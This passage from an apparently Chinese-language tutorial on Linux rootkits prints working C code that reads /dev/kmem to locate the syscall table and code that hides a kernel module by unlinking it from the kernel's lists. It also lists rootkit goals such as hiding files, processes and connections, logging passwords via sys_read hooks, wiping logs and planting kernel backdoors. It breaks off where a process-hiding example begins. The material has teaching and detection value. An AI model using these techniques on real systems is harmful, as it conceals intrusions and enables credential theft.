&lt;h3 id=&quot;0X4-DKOM-Rootkit&quot;&gt;&lt;a href=&quot;#0X4-DKOM-Rootkit&quot; class=&quot;headerlink&quot; title=&quot;0X4: DKOM Rootkit&quot;&gt;&lt;/a&gt;0X4: DKOM Rootkit&lt;/h3&gt;&lt;p&gt;DKOM means dynamic kernel object manipulation-直接内核对象操作。所有的操作系统(linux、windows)都会把内核中的运行状态(包括进程信息、系统内核状态)这些数据以对象的形式保存下来，包括:结构体、队列与数组。这些内核状态信息往往保存在内核空间的某个地址段中，当我们通过系统向内核查询这些”内核状态信息”(运行进程的列表、开放的端口等)时，这些数据就被解析并返回。因为这些数据是保存在内存中的，所以可以直接去操作它们。 其主要利用/dev/kmem技术。&lt;/p&gt;
&lt;p&gt;什么是/dev/kmem? 指的是kernel看到的虚拟内存的全镜像。可以用来访问kernel的内容，查看kernel的变量，也是DKOM rootkit的目标对象。注意还有个设备叫做/dev/mem,这是物理内存的全镜像，可以用来访问物理内存。&lt;/p&gt;
&lt;p&gt;以下是DKOM rootkit利用/dev/kmem来获取syscall table地址的代码：&lt;/p&gt;
&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;sys/stat.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;short&lt;/span&gt; limit;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; base;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; __attribute__ ((packed)) idtr;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;short&lt;/span&gt; off1;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;short&lt;/span&gt; sel;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; none,flags;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;short&lt;/span&gt; off2;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; __attribute__ ((packed)) idt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; kmem;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;readkmem&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *m,&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; off,&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; sz)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (lseek(kmem,off,SEEK_SET)!=off) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                perror(&lt;span class=&quot;string&quot;&gt;&quot;kmem lseek&quot;&lt;/span&gt;); &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (read(kmem,m,sz)!=sz) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                perror(&lt;span class=&quot;string&quot;&gt;&quot;kmem read&quot;&lt;/span&gt;); &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; CALLOFF 100     &lt;span class=&quot;comment&quot;&gt;/* we&#39;ll read first 100 bytes of int $0x80*/&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;main ()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; sys_call_off;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; sct;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; sc_asm[CALLOFF],*p;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/* well let&#39;s read IDTR */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;asm&lt;/span&gt; (&lt;span class=&quot;string&quot;&gt;&quot;sidt %0&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;=m&quot;&lt;/span&gt; (idtr));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;idtr base at 0x%X\n&quot;&lt;/span&gt;,(int)idtr.base);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/* now we will open kmem */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        kmem = open (&lt;span class=&quot;string&quot;&gt;&quot;/dev/kmem&quot;&lt;/span&gt;,O_RDONLY);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (kmem&amp;lt;&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) return &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/* read-in IDT for 0x80 vector (syscall) */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        readkmem (&amp;amp;idt,idtr.base+&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;*&lt;span class=&quot;number&quot;&gt;0x80&lt;/span&gt;,&lt;span class=&quot;keyword&quot;&gt;sizeof&lt;/span&gt;(idt));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        sys_call_off = (idt.off2 &amp;lt;&amp;lt; &lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;) | idt.off1;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;idt80: flags=%X sel=%X off=%X\n&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                (unsigned)idt.flags,(unsigned)idt.sel,sys_call_off);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/* we have syscall routine address now, look for syscall table&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           dispatch (indirect call) */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        readkmem (sc_asm,sys_call_off,CALLOFF);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        p = (char*)memmem (sc_asm,CALLOFF,&lt;span class=&quot;string&quot;&gt;&quot;\xff\x14\x85&quot;&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        sct = *(unsigned*)(p+&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (p) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt; (&lt;span class=&quot;string&quot;&gt;&quot;sys_call_table at 0x%x, call dispatch at 0x%x\n&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        sct, p);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        close(kmem);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;获取syscall table后，可以将整个syscall table替换为rootkit的syscall table， 也是前文提到的Suckit 的攻击方式。&lt;/p&gt;
&lt;h3 id=&quot;0x5-Rootkit-Objectives&quot;&gt;&lt;a href=&quot;#0x5-Rootkit-Objectives&quot; class=&quot;headerlink&quot; title=&quot;0x5: Rootkit Objectives&quot;&gt;&lt;/a&gt;0x5: Rootkit Objectives&lt;/h3&gt;&lt;p&gt;1.隐藏文件&lt;/p&gt;
&lt;p&gt;通过strace ls可以发现ls命令其实是通过sys_getdents64获得文件目录的，因此可以通过修改sys_getdents64系统调用或者更底层的readdir实现隐藏文件及目录 &lt;/p&gt;
&lt;p&gt;2.隐藏进程&lt;/p&gt;
&lt;p&gt;隐藏进程的方法和隐藏文件类似，ps命令是通过读取/proc文件系统下的进程目录获得进程信息的，只要能够隐藏/proc文件系统下的进程目录就可以达到隐藏进程的效果，即hook sys_getdents64和readdir等。   &lt;/p&gt;
&lt;p&gt;3.隐藏连接&lt;/p&gt;
&lt;p&gt;netstat命令是通过读取/proc文件系统下的net/tcp和net/udp文件获得当前连接信息，因此可以通过hook sys_read调用实现隐藏连接，也可以修改tcp4_seq_show和udp4_seq_show等函数实现。   &lt;/p&gt;
&lt;p&gt;4.隐藏模块&lt;/p&gt;
&lt;p&gt;lsmod命令主要是通过sys_query_module系统调用获得模块信息，可以通过hook sys_query_module系统调用隐藏模块，也可以通过将模块从内核模块链表中摘除从而达到隐藏效果  &lt;/p&gt;
&lt;p&gt;5.嗅探工具&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1) 嗅探工具可以通过libpcap库直接访问链路层，截获数据包

2) 也可以通过linux的netfilter框架在IP层的hook点上截获数据包
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;嗅探器要获得网络上的其他数据包需要将网卡设置为混杂模式，这是通过ioctl系统调用的SIOCSIFFLAGS命令实现的，查看网卡的当前模式是通过SIOCGIFFLAGS命令，因此可以通过hook sys_ioctl隐藏网卡的混杂模式  &lt;/p&gt;
&lt;p&gt;6.密码记录&lt;/p&gt;
&lt;p&gt;密码记录可以通过hook sys_read系统调用实现，比如通过判断当前运行的进程名或者当前终端是否关闭回显，可以获取用户的输入密码。hook sys_read还可以实现login后门等其它功能  &lt;/p&gt;
&lt;p&gt;7.日志擦除&lt;/p&gt;
&lt;p&gt;传统的unix日志主要在&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1) /var/log/messages

2) /var/log/lastlog

3) /var/run/utmp

4) /var

5) /log/wtmp下
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以通过编写相应的工具对日志文件进行修改，还可以将HISTFILE等环境变设为/dev/null隐藏用户的一些操作信息&lt;/p&gt;
&lt;p&gt;8.内核后门&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1) 本地的提权后门

本地的提权可以通过对内核模块发送定制命令实现

2) 网络的监听后门

网络内核后门可以在IP层对进入主机的数据包进行监听，发现匹配的指定数据包后立刻启动回连进程
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;0x6-Example-Module-Hiding&quot;&gt;&lt;a href=&quot;#0x6-Example-Module-Hiding&quot; class=&quot;headerlink&quot; title=&quot;0x6: Example-Module Hiding&quot;&gt;&lt;/a&gt;0x6: Example-Module Hiding&lt;/h3&gt;&lt;p&gt;在linux中，编写的内核模块通过insmod（实际上是执行了init_module系统调用）命令插入到内核中，模块便与一个struct module 结构体相关联，并成为内核的一部分。所有的内核模块都被维护在一个全局链表中，链表头是个全局变量struct module *modules. 任何一个新创建的模块，都会被加入到这个链表的头部，通过modules-&amp;gt;next引用。要枚举module的方法有许多种， a）.VFS方法: cat /proc/module: 直接读取/proc/module下的项; b). ring3方法: lsmod: 本质还是在读取/proc/module，做了一个代码封装，提供给用户一个良好的接口和界面; c). LKM方法: 直接通过kernel module枚举struct module-&amp;gt;list; d). LKM方法: 直接通过kernel module枚举struct module-&amp;gt;mkobj-&amp;gt;kobj-&amp;gt;entry; e).lKM方法: 直接通过kernel module枚举module-&amp;gt;mkobj-&amp;gt;kobj-&amp;gt;kset.&lt;/p&gt;
&lt;p&gt;下面介绍采用断链法技术进行内核模块隐藏的代码：&lt;/p&gt;
&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;MODULE HELPERS&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;使用&quot;断链法&quot;技术进行内核模块的隐藏&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;原理:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;1. linux将所有的内核模块都在内核中用循环双链表串联起来了&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2. 通过找到这些链表，并使用linux提供的链表操作宏将指定的&quot;元素(对应内核模块)&quot;从链表中断开&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3. 我们再通过lsmod、或者直接读取内核模块链表的时候自然无法枚举到被我们隐藏的模块了，达到隐藏模块的目的&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;关于内核模块链表的相关知识请参阅&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;http://www.cnblogs.com/LittleHann/p/3865490.html&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;module_hide&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (module_hidden) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        return;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    从struct module结构体可以看出，在内核态，我们如果要枚举当前模块列表，可以使用list、kobj这两个成员域进行枚举&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    自然在断链隐藏的时候也需要对这两个成员进行操作&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    module_previous = THIS_MODULE-&amp;gt;&lt;span class=&quot;built_in&quot;&gt;list&lt;/span&gt;.prev;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    list_del(&amp;amp;THIS_MODULE-&amp;gt;&lt;span class=&quot;built_in&quot;&gt;list&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    module_kobj_previous = THIS_MODULE-&amp;gt;mkobj.kobj.entry.prev;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    kobject_del(&amp;amp;THIS_MODULE-&amp;gt;mkobj.kobj);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    list_del(&amp;amp;THIS_MODULE-&amp;gt;mkobj.kobj.entry);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    module_hidden = !module_hidden;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;有关LKM模块隐藏还可参考： &lt;a href=&quot;http://www.freebuf.com/articles/system/54263.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Linux Rootkit系列一：LKM的基础编写及隐藏&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;0x7-Example-Process-Hiding&quot;&gt;&lt;a href=&quot;#0x7-Example-Process-Hiding&quot; class=&quot;headerlink&quot; title=&quot;0x7: Example-Process Hiding&quot;&gt;&lt;/a&gt;0x7: Example-Process Hiding&lt;/h3&gt;&lt;p&gt;上文提到，ps命令是通过读取/proc文件系统下的进程目录获得进程信息的，只要能够隐藏/proc文件系统下的进程目录就可以达到隐藏进程的效果。&lt;br&gt;以下是基于/proc目录读取函数劫持的进程隐藏代码：&lt;/p&gt;
